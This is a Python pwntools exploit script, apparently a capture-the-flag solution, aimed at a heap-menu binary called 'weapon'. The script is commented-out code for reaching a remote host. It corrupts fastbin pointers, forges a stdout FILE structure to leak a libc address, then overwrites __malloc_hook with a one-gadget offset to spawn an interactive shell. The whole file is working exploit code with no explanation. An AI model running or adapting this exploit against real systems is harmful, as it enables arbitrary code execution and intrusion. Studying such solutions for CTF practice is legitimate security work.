from pwn import *
context.log_level = "debug"
p = process("./weapon")
#p = remote("139.180.216.34",8888)
elf = ELF("./weapon")
a = elf.libc
#gdb.attach(p)
def create(idx,size,content):
	p.recvuntil(">> \n")
	p.sendline(str(1))
	p.recvuntil("weapon: ")
	p.sendline(str(size))
	p.recvuntil("index: ")
	p.sendline(str(idx))
	p.recvuntil("name:")
	p.send(content)
def delete(idx):
	p.recvuntil(">> ")
	p.sendline(str(2))
	p.recvuntil("idx :")
	p.sendline(str(idx))

def edit(idx,content):
	p.recvuntil(">> ")
	p.sendline(str(3))
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("content:\n")
	p.send(content)

create(0,0x60,"a")
create(1,0x60,"b")
create(2,0x60,"c")

delete(0)

delete(1)

p.recvuntil(">> ")
gdb.attach(p)
p.sendline("1"*0x1000)

create(3,0x60,"\xdd\x25")

create(4,0x60,"e")
delete(2)
delete(1)
edit(1,"\x00")
create(5,0x60,"f")
create(6,0x60,"f")
file_struct = p64(0xfbad1887)+p64(0)*3+"\x58"
create(7,0x60,"\x00"*0x33+file_struct)
libc_addr =  u64(p.recvuntil("\x00",drop=True)[1:].ljust(8,"\x00"))-a.symbols["_IO_2_1_stdout_"]-131
print hex(libc_addr)
delete(6)
edit(6,p64(libc_addr+a.symbols["__malloc_hook"]-0x23))

create(8,0x60,"t")

create(9,0x60,"a"*0x13+p64(libc_addr+0xf1147))
p.recvuntil(">> \n")
p.sendline(str(1))
p.recvuntil("weapon: ")
p.sendline(str(0x60))
p.recvuntil("index: ")
p.sendline(str(6))

p.interactive()
